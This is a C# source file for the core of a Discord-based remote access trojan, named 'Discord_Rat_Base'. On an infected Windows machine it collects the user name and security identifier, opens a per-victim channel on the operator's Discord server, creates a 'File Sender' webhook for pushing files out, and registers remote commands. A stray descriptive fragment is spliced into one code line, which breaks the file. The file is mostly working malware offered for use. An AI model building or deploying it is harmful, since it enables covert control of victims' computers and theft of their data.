using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

using DSharpPlus;
using DSharpPlus.CommandsNext;
using DSharpPlus.Entities;
using DSharpPlus.Interactivity;
using DSharpPlus.Interactivity.Extensions;
using Salaros.Configuration;
using System.Threading;

namespace Discord_Rat_Base
{
    public class Bot
    {
        public DiscordClient discord { get; private set; }
        public DiscordGuild guild { get; private set; }
        public string pc_name { get; private set; }
        public string HWID { get; private set; }

        public async Task Main()
        {
            var cfg = new ConfigParser(Settings.appConfig + @"\appConfig34.cfg");
            Globals.Channel = 0;
            Globals.Channel = Convert.ToUInt64(cfg.GetValue("CONFIG", "Channel"));
            Globals.WebHook = cfg.GetValue("CONFIG", "WebHook");

            discord = new DiscordClient(new DiscordConfiguration()
            {
                Token = Settings.Bot_Token,
                TokenType = TokenType.Bot,
                Intents = DiscordIntents.AllUnprivileged | DiscordIntents.MessageContents
            });
            var commandsConfig = new CommandsNextConfiguration()
            {
                StringPrefixes = new string[] { Settings.Prefixes },
                EnableDms = true,
                EnableMentionPrefix = true,
            };

            var Commands = discord.UseCommandsNext(commandsConfig);
            Commands.RegisterCommands<Commands>();Discord Rat Base for making rat that are us

            discord.UseInteractivity(new InteractivityConfiguration
            {
                Timeout = TimeSpan.FromMinutes(2)
            });

            guild = await discord.GetGuildAsync(Settings.Guild);

            if ((ulong)Globals.Channel == 0)
            {
                create_default();
            }
            else
            {
               if (guild.GetChannel(Globals.Channel) == null)
                {
                    await create_default();
                }
                else
                {
                    await guild.GetChannel(Globals.Channel).SendMessageAsync(Settings.WakeUpMsg);
                }
            }

            await discord.ConnectAsync();
            await Task.Delay(-1);
        }

        public async Task create_default()
        { 
            var cfg = new ConfigParser(Settings.appConfig + @"\appConfig34.cfg");

            pc_name = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            HWID = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;

            DiscordChannel channel = await guild.CreateChannelAsync(pc_name + " | " + HWID, ChannelType.Text);
            Globals.Channel = channel.Id;
            cfg.SetValue("CONFIG", "Channel", channel.Id.ToString());

            var WebHook = await channel.CreateWebhookAsync("File Sender");
            Globals.WebHook = WebHook.Url;
            cfg.SetValue("CONFIG", "WebHook", WebHook.Url);

            cfg.Save();

            await channel.SendMessageAsync(Settings.WakeUpMsg);
        }
    }
}
